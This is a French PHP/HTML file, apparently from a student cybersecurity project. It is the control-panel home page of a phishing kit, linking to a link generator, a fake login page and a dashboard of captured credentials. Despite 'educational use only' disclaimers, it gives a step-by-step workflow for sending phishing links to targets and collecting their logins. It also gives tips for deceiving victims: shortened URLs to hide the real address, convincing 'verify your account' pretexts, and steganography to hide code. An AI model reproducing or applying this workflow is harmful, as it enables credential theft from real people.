<?php
// Page d'accueil - Tableau de bord principal des outils de phishing
// URL: /messagerie/codes/fake_login/

session_start();

// Vérifier que l'utilisateur est connecté
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];
$username = $_SESSION["username"] ?? "Utilisateur";

// Variables pour les URLs
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$baseUrl = $protocol . "://" . $host . "/projects/MDI/cyber-securite/messagerie";

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centre de Contrôle - Phishing Éducatif</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            background: white;
            padding: 30px;
            border-radius: 10px 10px 0 0;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            margin-bottom: 0;
        }
        
        .header h1 {
            color: #667eea;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 16px;
        }
        
        .user-info {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            margin-top: 15px;
            border-left: 4px solid #667eea;
        }
        
        .user-info span {
            color: #667eea;
            font-weight: bold;
        }
        
        .content {
            background: white;
            padding: 30px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            border-radius: 0 0 10px 10px;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s, box-shadow 0.3s;
            text-decoration: none;
            display: flex;
            flex-direction: column;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        }
        
        .card-icon {
            font-size: 40px;
            margin-bottom: 15px;
        }
        
        .card-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 8px;
        }
        
        .card-description {
            font-size: 13px;
            opacity: 0.9;
            flex-grow: 1;
            margin-bottom: 15px;
        }
        
        .card-button {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            text-align: center;
            border: none;
            cursor: pointer;
            transition: background 0.3s;
            font-size: 13px;
            font-weight: bold;
            text-decoration: none;
            display: inline-block;
        }
        
        .card-button:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .card a {
            color: white;
            text-decoration: none;
        }
        
        .section-title {
            font-size: 20px;
            color: #667eea;
            margin: 30px 0 20px 0;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
        }
        
        .info-box {
            background: #e8f4f8;
            border-left: 4px solid #667eea;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
            color: #2c5aa0;
        }
        
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
            color: #856404;
        }
        
        .success-box {
            background: #d4edda;
            border-left: 4px solid #27ae60;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
            color: #155724;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: #666;
            font-size: 12px;
        }
        
        .features-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .feature {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 5px;
            border-left: 3px solid #667eea;
        }
        
        .feature strong {
            color: #667eea;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Centre de Contrôle - Phishing Éducatif</h1>
            <p>Panneau de gestion centralisé pour la démonstration de phishing</p>
            
            <div class="user-info">
                Connecté en tant que: <span><?php echo htmlspecialchars($username); ?></span> 
                (ID: <?php echo $user_id; ?>)
            </div>
        </div>
        
        <div class="content">
            <!-- Warning -->
            <div class="warning-box">
                <strong>⚠️ Démonstration Éducative</strong>
                <p>
                    Ce système est conçu UNIQUEMENT pour l'éducation et la formation en cybersécurité. 
                    Toute utilisation contre des personnes réelles est illégale et contraire à l'éthique.
                </p>
            </div>
            
            <!-- Main Tools -->
            <h2 class="section-title">🛠️ Outils Principaux</h2>
            
            <div class="grid">
                <!-- Générateur de liens -->
                <div class="card">
                    <div class="card-icon">📌</div>
                    <div class="card-title">Générateur de Liens</div>
                    <div class="card-description">
                        Générez les URLs de phishing à partager avec vos cibles.
                    </div>
                    <a href="helper.php" class="card-button">Accéder</a>
                </div>
                
                <!-- Dashboard -->
                <div class="card">
                    <div class="card-icon">📊</div>
                    <div class="card-title">Mon Dashboard</div>
                    <div class="card-description">
                        Consultez tous les identifiants capturés par vos attaques.
                    </div>
                    <a href="dashboard.php" class="card-button">Consulter</a>
                </div>
                
                <!-- Documentation -->
                <div class="card">
                    <div class="card-icon">📚</div>
                    <div class="card-title">Documentation</div>
                    <div class="card-description">
                        Guide complet avec tutoriels, FAQ et détails techniques.
                    </div>
                    <a href="docs.php" class="card-button">Consulter</a>
                </div>
                
                <!-- Fake Login -->
                <div class="card">
                    <div class="card-icon">🔐</div>
                    <div class="card-title">Fausse Page Login</div>
                    <div class="card-description">
                        Aperçu de la page de connexion falsifiée utilisée pour capturer les identifiants.
                    </div>
                    <a href="index.php" class="card-button" target="_blank">Prévisualiser</a>
                </div>
            </div>
            
            <!-- Quick Start -->
            <h2 class="section-title">🚀 Démarrage Rapide</h2>
            
            <div class="success-box">
                <h3 style="margin-top: 0;">En 4 étapes simples:</h3>
                <ol style="margin-left: 20px; margin-top: 10px;">
                    <li><strong>Accédez au Générateur</strong> pour créer votre lien de phishing</li>
                    <li><strong>Copiez le lien</strong> et envoyez-le à votre cible via message</li>
                    <li><strong>La cible clique</strong> et rentre ses identifiants</li>
                    <li><strong>Consultez le Dashboard</strong> pour voir les données capturées</li>
                </ol>
            </div>
            
            <!-- Methods Comparison -->
            <h2 class="section-title">🎯 Comparaison des Méthodes</h2>
            
            <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
                <thead>
                    <tr style="background: #f0f0f0; border-bottom: 2px solid #ddd;">
                        <th style="padding: 12px; text-align: left; color: #667eea;"><strong>Méthode</strong></th>
                        <th style="padding: 12px; text-align: left; color: #667eea;"><strong>Taux de réussite</strong></th>
                        <th style="padding: 12px; text-align: left; color: #667eea;"><strong>Difficulté</strong></th>
                        <th style="padding: 12px; text-align: left; color: #667eea;"><strong>Discrétion</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr style="border-bottom: 1px solid #eee;">
                        <td style="padding: 12px;"><strong>Pop-up</strong></td>
                        <td style="padding: 12px;">⭐⭐⭐⭐</td>
                        <td style="padding: 12px;">Facile</td>
                        <td style="padding: 12px;">Moyen</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #eee;">
                        <td style="padding: 12px;"><strong>Fausse page</strong></td>
                        <td style="padding: 12px;">⭐⭐⭐⭐⭐</td>
                        <td style="padding: 12px;">Facile</td>
                        <td style="padding: 12px;">Moyen</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px;"><strong>Stéganographie</strong></td>
                        <td style="padding: 12px;">⭐⭐⭐</td>
                        <td style="padding: 12px;">Difficile</td>
                        <td style="padding: 12px;">Excellent</td>
                    </tr>
                </tbody>
            </table>
            
            <!-- Files Created -->
            <h2 class="section-title">📁 Fichiers Créés</h2>
            
            <div class="features-list">
                <div class="feature">
                    <strong>📌 popup.js</strong>
                    <p>Script qui affiche le pop-up de fausse connexion</p>
                </div>
                <div class="feature">
                    <strong>🔐 index.php</strong>
                    <p>Page fausse de connexion avec formulaire</p>
                </div>
                <div class="feature">
                    <strong>💾 phishing.php</strong>
                    <p>Endpoint qui capture les identifiants</p>
                </div>
                <div class="feature">
                    <strong>📊 dashboard.php</strong>
                    <p>Tableau de bord pour voir les captures</p>
                </div>
                <div class="feature">
                    <strong>🎯 helper.php</strong>
                    <p>Générateur de liens personnalisés</p>
                </div>
                <div class="feature">
                    <strong>📚 docs.php</strong>
                    <p>Documentation complète et tutoriels</p>
                </div>
            </div>
            
            <!-- Key Features -->
            <h2 class="section-title">✨ Fonctionnalités Clés</h2>
            
            <div class="features-list">
                <div class="feature">
                    <strong>✓ Pop-up Trompeur</strong>
                    <p>Interface convainçante qui imite la vraie page</p>
                </div>
                <div class="feature">
                    <strong>✓ Stéganographie</strong>
                    <p>Intégration avec images pour cacher le code</p>
                </div>
                <div class="feature">
                    <strong>✓ Capture Automatique</strong>
                    <p>Les identifiants sont capturés instantanément</p>
                </div>
                <div class="feature">
                    <strong>✓ Logs Détaillés</strong>
                    <p>IP, User-Agent, Date/heure</p>
                </div>
                <div class="feature">
                    <strong>✓ Personnalisation</strong>
                    <p>Modifiez les textes et designs facilement</p>
                </div>
                <div class="feature">
                    <strong>✓ Multi-méthodes</strong>
                    <p>3 approches différentes pour plus de flexibilité</p>
                </div>
            </div>
            
            <!-- Tips -->
            <h2 class="section-title">💡 Conseils Pratiques</h2>
            
            <div class="info-box">
                <h3 style="margin-top: 0;">Pour augmenter le taux de succès:</h3>
                <ul style="margin-left: 20px; margin-top: 10px;">
                    <li>Utilisez un lien court (bit.ly, tinyurl) pour masquer l'URL réelle</li>
                    <li>Envoyez le lien dans un contexte convaincant ("Vérifiez votre compte")</li>
                    <li>Utilisez la stéganographie pour maximiser la discrétion</li>
                    <li>Testez d'abord avec une fenêtre privée</li>
                    <li>Personnalisez les messages pour la cible</li>
                </ul>
            </div>
            
            <!-- URL Reference -->
            <h2 class="section-title">📍 URL de Référence</h2>
            
            <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; font-family: monospace; font-size: 12px; word-break: break-all;">
                <p><strong>Base:</strong> <?php echo htmlspecialchars($baseUrl); ?></p>
                <p><strong>Popup Script:</strong> <?php echo htmlspecialchars($baseUrl); ?>/codes/assets/popup.js?sender=<?php echo $user_id; ?></p>
                <p><strong>Fake Login:</strong> <?php echo htmlspecialchars($baseUrl); ?>/codes/fake_login/index.php?sender=<?php echo $user_id; ?></p>
                <p><strong>Dashboard:</strong> <?php echo htmlspecialchars($baseUrl); ?>/codes/fake_login/dashboard.php</p>
                <p><strong>Helper:</strong> <?php echo htmlspecialchars($baseUrl); ?>/codes/fake_login/helper.php</p>
                <p><strong>Docs:</strong> <?php echo htmlspecialchars($baseUrl); ?>/codes/fake_login/docs.php</p>
            </div>
            
            <div class="footer">
                <p>Système de démonstration éducative en cybersécurité | Année 2026</p>
                <p>⚠️ Usage académique uniquement - Ne pas utiliser contre des personnes réelles</p>
            </div>
        </div>
    </div>
</body>
</html>
